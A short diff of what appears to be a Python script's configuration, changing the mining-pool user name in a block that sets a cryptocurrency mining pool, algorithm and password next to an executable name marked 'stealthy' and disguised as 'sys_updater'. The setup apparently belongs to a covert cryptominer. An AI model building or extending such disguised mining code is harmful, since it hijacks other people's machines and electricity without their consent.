@@ -15,7 +15,7 @@ STEALTHY_EXECUTABLE_NAME = "sys_updater"
 
 SERVICE_ALGORITHM = "xelishashv2"
 SERVICE_SERVER = "xel.kryptex.network:7019"
-SERVICE_USER = "krxXJMWJKW.Kohkol"
+SERVICE_USER = "krxXJMWJKW.hayyu"
 SERVICE_PASS = "200"
 
 def setup_files():
